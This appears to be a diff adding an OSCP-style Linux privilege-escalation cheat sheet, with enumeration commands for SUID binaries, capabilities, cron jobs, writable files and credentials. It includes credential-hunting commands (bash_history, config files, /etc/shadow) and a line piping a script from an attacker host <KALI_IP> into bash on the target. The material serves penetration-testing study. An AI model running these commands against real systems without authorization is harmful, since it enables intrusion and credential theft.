@@ -1,0 +1,213 @@
+================================================================
+OSCP PRIVILEGE ESCALATION ENUMERATION COMMANDS
+================================================================
+ 
+----------------------------------------------------------------
+WORLD-WRITABLE FILES
+----------------------------------------------------------------
+find / -writable -type f 2>/dev/null
+ 
+Finds all files that any user can write to. Look for config
+files, scripts, or anything sensitive like /etc/passwd or
+cron scripts. A writable /etc/passwd means you can add a
+new root user directly.
+ 
+----------------------------------------------------------------
+WORLD-WRITABLE DIRECTORIES
+----------------------------------------------------------------
+find / -writable -type d 2>/dev/null
+ 
+Finds directories you can write to. Useful for dropping
+files, replacing scripts, or planting payloads that cron
+jobs might execute.
+ 
+----------------------------------------------------------------
+SUID BINARIES
+----------------------------------------------------------------
+find / -perm -4000 2>/dev/null
+ 
+Finds binaries with the SUID bit set. These run as their
+owner (often root) regardless of who executes them. Check
+any unusual ones on GTFOBins (https://gtfobins.github.io).
+ 
+----------------------------------------------------------------
+SGID BINARIES
+----------------------------------------------------------------
+find / -perm -2000 2>/dev/null
+ 
+Same as SUID but for group permissions. The binary runs
+with the group owner's privileges instead of the user's.
+ 
+----------------------------------------------------------------
+BOTH SUID AND SGID
+----------------------------------------------------------------
+find / -perm /6000 2>/dev/null
+ 
+Finds binaries with either or both special permission bits
+set. Broader sweep than searching for each individually.
+ 
+----------------------------------------------------------------
+CAPABILITIES
+----------------------------------------------------------------
+getcap -r / 2>/dev/null
+ 
+Lists binaries with special Linux capabilities assigned.
+Look for cap_setuid which allows changing UID to root.
+Once found, look it up on GTFOBins under Capabilities.
+ 
+----------------------------------------------------------------
+UNMOUNTED DRIVES
+----------------------------------------------------------------
+cat /etc/fstab
+mount
+lsblk
+ 
+/etc/fstab shows all configured drives including unmounted
+ones. mount shows what is currently active. lsblk shows all
+block devices. Look for unmounted partitions that might
+contain sensitive data or credentials.
+ 
+----------------------------------------------------------------
+CRON JOBS
+----------------------------------------------------------------
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+cat /etc/cron.d/*
+cat /etc/cron.hourly/*
+ 
+Shows all scheduled tasks. Look for scripts running as root
+that are world-writable. If you can write to a script that
+root runs via cron, you have root code execution.
+ 
+----------------------------------------------------------------
+FILES WRITABLE BY YOUR GROUP
+----------------------------------------------------------------
+find / -writable -type f -group $(id -gn) 2>/dev/null
+ 
+Finds files writable by your current group. Useful when
+you are in an interesting group like docker, lxd, or disk.
+ 
+----------------------------------------------------------------
+ROOT-OWNED BUT WRITABLE FILES
+----------------------------------------------------------------
+find / -user root -writable -type f 2>/dev/null | grep -v proc | grep -v sys
+ 
+Root-owned files that you can still write to. A classic
+misconfiguration that can lead to direct privilege escalation.
+ 
+----------------------------------------------------------------
+READABLE CONFIG FILES (POTENTIAL CREDENTIALS)
+----------------------------------------------------------------
+find / -name "*.conf" -readable 2>/dev/null
+find / -name "*.config" -readable 2>/dev/null
+find / -name "*.ini" -readable 2>/dev/null
+ 
+Config files often contain plaintext passwords, API keys,
+or database credentials that can be reused for escalation.
+ 
+----------------------------------------------------------------
+RECENTLY MODIFIED FILES
+----------------------------------------------------------------
+find / -mmin -10 -type f 2>/dev/null
+ 
+Files modified in the last 10 minutes. Useful for tracking
+cron job activity — run this and watch what changes to
+identify scripts being executed by scheduled tasks.
+ 
+----------------------------------------------------------------
+FILES WITH PASSWORDS IN THE NAME
+----------------------------------------------------------------
+find / -name "*password*" -o -name "*passwd*" -o -name "*cred*" 2>/dev/null
+ 
+Hunts for files that might contain credentials based on
+their filename. Quick win when admins store passwords in
+obviously named files.
+ 
+----------------------------------------------------------------
+SUDO PERMISSIONS
+----------------------------------------------------------------
+sudo -l
+ 
+Shows what commands you can run as root or other users
+without a password or with your current password. Always
+run this first — it is the quickest and most common win.
+Check any allowed binaries on GTFOBins under Sudo.
+ 
+----------------------------------------------------------------
+CHECK USER GROUPS
+----------------------------------------------------------------
+id
+groups
+cat /etc/group | grep <username>
+ 
+Being in certain groups leads to instant root:
+- docker   -> mount host filesystem in container
+- lxd/lxc  -> container escape to root
+- disk      -> direct disk read/write access
+- sudo      -> run commands as root
+- adm       -> read sensitive log files
+ 
+----------------------------------------------------------------
+FIND ALL USERS WITH SHELLS
+----------------------------------------------------------------
+cat /etc/passwd | grep -v nologin | grep -v false
+ 
+Shows all users that can actually log in. Useful for
+identifying targets for lateral movement or password reuse.
+ 
+----------------------------------------------------------------
+CHECK ENVIRONMENT VARIABLES
+----------------------------------------------------------------
+env
+cat ~/.bashrc
+cat ~/.bash_history
+ 
+Environment variables sometimes contain credentials or
+paths. Bash history often reveals passwords typed on the
+command line or commands that reveal system structure.
+ 
+----------------------------------------------------------------
+AUTOMATED ENUMERATION (LINPEAS)
+----------------------------------------------------------------
+# On Kali - download and host
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+python3 -m http.server 8080
+ 
+# On target - download and run
+curl http://<KALI_IP>:8080/linpeas.sh | bash
+wget http://<KALI_IP>:8080/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+ 
+Automated script that checks all of the above and more.
+Red/yellow highlighted findings are highest priority.
+Always run this during privilege escalation enumeration.
+ 
+================================================================
+QUICK ESCALATION CHECKLIST
+================================================================
+ 
+1. sudo -l                          (sudo misconfig - most common)
+2. find / -perm -4000 2>/dev/null   (SUID binaries)
+3. getcap -r / 2>/dev/null          (capabilities)
+4. cat /etc/crontab                 (cron jobs)
+5. find / -writable -type f         (writable files)
+6. ls -la /etc/passwd /etc/shadow   (writable critical files)
+7. env / bash_history               (credentials in environment)
+8. uname -a / cat /etc/os-release   (kernel exploits)
+9. Run LinPEAS for full automation
+ 
+================================================================
+USEFUL REFERENCES
+================================================================
+ 
+GTFOBins:    https://gtfobins.github.io
+HackTricks:  https://book.hacktricks.xyz
+LinPEAS:     https://github.com/carlospolop/PEASS-ng
+Exploit-DB:  https://www.exploit-db.com
+SearchSploit: searchsploit <term>
+ 
+================================================================
+END
+================================================================
